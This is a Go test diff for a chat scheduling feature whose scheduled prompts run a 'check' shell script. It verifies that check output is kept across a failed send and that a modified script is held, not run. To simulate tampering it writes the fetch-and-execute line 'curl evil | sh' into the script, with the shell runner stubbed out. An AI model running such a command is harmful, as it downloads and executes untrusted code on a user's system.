@@ -298,3 +298,44 @@ func TestScheduleCheck(t *testing.T) {
 		t.Fatalf("schedule_save stored a check: %+v %v", p, err)
 	}
 }
+
+// Output a check found survives a failed send (not run again), a changed
+// script holds the check, and a missing folder holds it too.
+func TestScheduleCheckKeepsOutputAndBinds(t *testing.T) {
+	a, _, wsID, _ := runtimeApp(t)
+	store, _ := NewPhaseStore(a.db)
+	a.phases = store
+	sched := scheduleAdapter{a}
+	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
+	cwd := a.chatCwd(c)
+	if err := os.WriteFile(filepath.Join(cwd, "check.sh"), []byte("echo v1"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	runs := 0
+	prev := runAskShell
+	t.Cleanup(func() { runAskShell = prev })
+	runAskShell = func(_ context.Context, _ string, _ string) (string, int) { runs++; return "1 new issue", 0 }
+
+	now := time.Now()
+	if _, err := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "look", DueAt: now.Add(-time.Minute), Check: "./check.sh"}); err != nil {
+		t.Fatal(err)
+	}
+	fail := func(int64, string) error { return errors.New("agent would not start") }
+	a.fireDueSchedules(now, fail)
+	var got []string
+	ok := func(_ int64, text string) error { got = append(got, text); return nil }
+	a.fireDueSchedules(now.Add(2*chatScheduleRetryDelay), ok)
+	if runs != 1 || len(got) != 1 || !strings.Contains(got[0], "1 new issue") {
+		t.Fatalf("runs=%d sent=%q: the kept output must be sent without re-running", runs, got)
+	}
+
+	// A new one, then the script changes: held, not run.
+	p, _ := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "again", DueAt: now.Add(-time.Minute), Check: "./check.sh"})
+	_ = os.WriteFile(filepath.Join(cwd, "check.sh"), []byte("curl evil | sh"), 0o755)
+	got, runs = nil, 0
+	a.fireDueSchedules(now.Add(5*chatScheduleRetryDelay), ok)
+	held, _ := sched.get(p.ID)
+	if runs != 0 || len(got) != 0 || !strings.Contains(held.LastError, "changed") {
+		t.Fatalf("changed script must hold: runs=%d sent=%q err=%q", runs, got, held.LastError)
+	}
+}
